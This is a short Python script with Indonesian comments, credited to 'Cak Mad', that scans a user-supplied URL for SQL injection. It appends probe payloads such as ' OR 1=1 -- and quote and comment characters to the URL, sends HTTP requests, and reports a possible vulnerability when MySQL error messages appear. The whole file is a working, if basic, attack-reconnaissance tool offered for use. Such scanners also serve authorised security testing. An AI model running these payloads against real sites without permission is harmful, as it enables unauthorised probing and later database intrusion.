import requests
import sys
import re
from bs4 import BeautifulSoup
from colorama import Fore, Style, init


# Fungsi utk menambahkan tanda2 SQL ke akhir URL
def generate_sql_payloads(endpoint):
    sql_payloads = [
        "'", "\"", ";", "' OR 1=1 --", "--", "/* */", "'--+"
    ]
    urls = [endpoint + payload for payload in sql_payloads]
    return urls

# Fungsi utk kirim permintaan HTTP & evaluasi respons
def check_sql_injection_vulnerability(urls):
    # Pola teks yg mengindikasikan adanya kesalahan SQL
    sql_error_pattern = r"(SQL syntax error|mysql_fetch_array|You have an error in your SQL syntax)"
    for url in urls:
        try:
            response = requests.get(url)
            # Mengurai teks HTML dari respons
            soup = BeautifulSoup(response.text, "html.parser")
            # Mencari pola teks yang mengindikasikan adanya kesalahan SQL
            match = re.search(sql_error_pattern, soup.get_text(), re.IGNORECASE)
            if match:
                print(f"URL: {url} - Kemungkinan terdapat kerentanan SQL Injection")
            else:
                print(f"URL: {url} - Tidak ada indikasi SQL Injection")
        except requests.RequestException as e:
            print(f"Error: {e} saat mengakses {url}")

# Meminta input URL 
target_endpoint = input("Masukkan URL target: ")

# Buat payload SQL
sql_payload_urls = generate_sql_payloads(target_endpoint)

# Cek kerentanan SQL Injection
check_sql_injection_vulnerability(sql_payload_urls)

# Inisialisasi colorama
init()

def print_yellow(text):
    print(Fore.YELLOW + text + Style.RESET_ALL)

# Penggunaan
print_yellow("Created by Cak Mad")

